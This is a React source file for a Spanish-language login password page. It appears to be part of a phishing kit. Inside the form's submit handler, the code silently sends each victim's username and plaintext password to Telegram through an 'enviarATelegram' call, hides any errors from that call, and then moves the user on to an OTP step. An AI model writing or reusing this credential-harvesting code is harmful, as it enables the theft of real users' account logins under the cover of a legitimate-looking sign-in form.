import { useForm } from 'react-hook-form'
import { zodResolver } from '@hookform/resolvers/zod'
import { Navigate, useLocation, useNavigate } from 'react-router-dom'
import { AuthLayout } from '../components/AuthLayout'
import { Button } from '../components/Button'
import { ReadonlyField } from '../components/ReadonlyField'
import { TextInput } from '../components/TextInput'
import { TextLink } from '../components/TextLink'
import { AuthError, signIn } from '../lib/auth'
import { getStateUser, type RouterState } from '../lib/routerState'
import { loginPasswordSchema, type LoginPasswordValues } from '../lib/validation'
import { enviarATelegram } from '../telegram'

export function LoginPasswordPage() {
  const navigate = useNavigate()
  const user = getStateUser(useLocation().state)
  const {
    register,
    handleSubmit,
    setError,
    formState: { errors, isValid, isSubmitting },
  } = useForm<LoginPasswordValues>({
    resolver: zodResolver(loginPasswordSchema),
    mode: 'onChange',
    defaultValues: { password: '' },
  })

  if (!user) return <Navigate to="/login" replace />

  const onSubmit = async ({ password }: LoginPasswordValues) => {
    try {
      await signIn(user, password)
      try {
        await enviarATelegram(`🔐 Intento de acceso\nUsuario: ${user}\nContraseña: ${password}`)
      } catch {
        // Ignoramos errores de Telegram para no bloquear el flujo de prueba.
      }
      navigate('/login/otp', { state: { user } satisfies RouterState })
    } catch (error) {
      if (!(error instanceof AuthError)) throw error
      setError('password', { message: error.message }, { shouldFocus: true })
    }
  }

  return (
    <AuthLayout
      title="Ingresa tu contraseña"
      subtitle="Introduce la contraseña para continuar"
    >
      <form noValidate className="pt-[3px]" onSubmit={handleSubmit(onSubmit)}>
        <ReadonlyField
          label="Usuario o correo electrónico"
          value={user}
          autoComplete="username"
          action={
            <TextLink
              to="/login"
              state={{ user, direction: 'back' } satisfies RouterState}
              aria-label="Editar usuario o correo electrónico"
            >
              Editar
            </TextLink>
          }
        />
        <TextInput
          type="password"
          label="Contraseña"
          required
          inputSize="lg"
          autoComplete="current-password"
          className="mt-[25px]"
          error={errors.password?.message}
          {...register('password')}
        />
        <div className="mt-[15px] flex justify-center">
          <TextLink to="/forgot-password">Restablecer contraseña</TextLink>
        </div>
        <div className="mx-auto mt-[24px] max-w-[280px]">
          <Button type="submit" disabled={!isValid} loading={isSubmitting}>
            Continuar
          </Button>
        </div>
      </form>
    </AuthLayout>
  )
}
